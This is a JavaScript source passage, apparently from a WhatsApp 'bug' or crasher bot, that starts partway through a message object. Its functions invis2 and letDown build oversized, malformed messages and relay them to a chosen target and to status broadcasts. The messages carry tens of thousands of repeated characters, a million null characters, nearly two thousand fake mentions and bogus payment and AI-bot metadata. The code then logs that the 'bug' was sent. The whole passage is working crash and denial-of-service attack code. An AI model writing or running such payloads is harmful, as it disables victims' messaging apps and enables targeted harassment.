          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyEiIzFRMjNBYQBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
          streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
          caption: "ꦾ".repeat(20000) + "ꦾ".repeat(60000),
          contextInfo: {
            stanzaId: "Thumbnail.id",
            isForwarded: true,
            forwardingScore: 999,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
            ]
          }
        }
      }
    }
  }, {});

  const Payment_Info = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "Danz Kil You",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: "\u0000".repeat(1045000),
        version: 3
      }
    }
  }, {});

  await xincrash.relayMessage("status@broadcast", viewOnceMsg.message, {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
  
  await xincrash.relayMessage("status@broadcast", Payment_Info.message, {
    messageId: Payment_Info.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
}

async function invis2(xincrash, target) {
  const Interactive = "ꦾ".repeat(20000) + "ꦾ".repeat(60000);
  
  const OnceMessage = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "99999999999999",
          height: "99999999999",
          width: "9999999999",
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
          mediaKeyTimestamp: "172519628",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyEiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
          streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
          caption: Interactive,
          contextInfo: {
            stanzaId: "PaymentInvite_id",
            isForwarded: true,
            forwardingScore: 999,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
            ]
          }
        }
      }
    }
  }, {});

  await xincrash.relayMessage(target, OnceMessage.message, {
    messageId: OnceMessage.key.id
  });
}

async function letDown(xincrash, target) {
    let msg1 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo: {
                        participant: target,
                        remoteJid: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1900 },
                                () => "1" + Math.floor(Math.random() * 500000) + "0@s.whatsapp.net",
                            ),
                        ],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimeStamp: Date.now() + 1814400000,
                            },
                        },
                        forwardedAiBotMessageInfo: {
                            botName: "META AI",
                            botJid: Math.floor(Math.random() * 9999).toString(),
                            creatorName: "ZayHere\\1337",
                        },
                    },
                    body: {
                        text: 'Zayy Cpe....' + new Date().toString() 
                    },
                    footer: {
                        text: 'Im Wanna Be Better..',
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{[".repeat(10000),
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },                                
                            {
                                name: "call_permission_request",
                                buttonParamsJson: JSON.stringify({
                                    status: true,
                                }),
                            },
                            {
                                name: "quick_reply",
                                buttonsParamsJson: JSON.stringify({
                                    display_text: "𑜦𑜠".repeat(5000),
                                    id: 'ZayyBete'
                                }),
                            },
                            {
                                name: "cta_url",
                                buttonsParamsJson: JSON.stringify({
                                    display_text: "𑜦𑜠".repeat(5000),
                                    id: "Gatau"
                                }),
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𑜦𑜠".repeat(5000),
                                    id: "ZayyGptJier"
                                }),
                            },
                            {
                                name: "payment_info",
                                buttonParamsJson: JSON.stringify({
                                        currency: "USD",
                                        total_amount: { value: 9000, offset: 100 },
                                        reference_id: "4P46GMY57GC",
                                        type: "physical-goods",
                                        order: {
                                            status: "pending",
                                            subtotal: { value: 9000, offset: 100 },
                                            order_type: "ORDER",
                                            items: [
                                                {
                                                    name: " Zay Come Back ",
                                                    amount: { value: 9000, offset: 100 },
                                                    quantity: 1,
                                                    sale_amount: { value: 9000, offset: 100 }
                                                }
                                            ]
                                        },
                                        payment_settings: [
                                            {
                                                type: "pix_static_code",
                                                pix_static_code: {
                                                    merchant_name: " ZayComebackX ",
                                                    key: "+99999999999",
                                                    key_type: "PHONE"
                                                },
                                            },
                                        ],
                                    }),
                                },
                            ],
                        },
                    },
                },  
            },
        };

        await xincrash.relayMessage(target, msg1, {
            messageId: null,
            participant: { jid: target },
        });

        let msg4 = {
            interactiveMessage: {
                header: {
                    title: '\u0000',
                    hasMediaAttahment: true,
                },
                body: {
                    text: '𑜦𑜠'.repeat(10000),
                },
                footer: {
                    text: 'Zinging',
                },
                nativeFlowMessage: {
                    messageParamsJson: "",
                    buttons: [
                        { name: "cta_url", buttonParamsJson: "\u0003".repeat(1000) },
                        { name: "call_permission_request", buttonParamsJson: "\u0003".repeat(1000) },
                    ],
                },
                contextInfo: {
                    stanzaId: Math.floor(Math.random() * 9999).toString(),
                    isForwarded: true,
                    forwardingScore: 999,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from(
                            { length: 1900 },
                            () => "1" + Math.floor(Math.random() * 500000) + "0@s.whatsapp.net",
                        ),
                    ],
                    quotedMessage: {
                        interactiveMessage: {
                            body: {
                                text: 'Ui',
                            },
                            footer: {
                                text: '𑜦𑜠',
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "{}",
                            },
                        },
                    },
                },
            },
        };

        await xincrash.relayMessage(target, msg4, {
            messageId: null,
            participant: { jid: target },
        });
        console.log(chalk.red(`Succes Sending Bug Goblok To ${target}`));
    }
//--------------------{ End Function Bugs }--------------------//
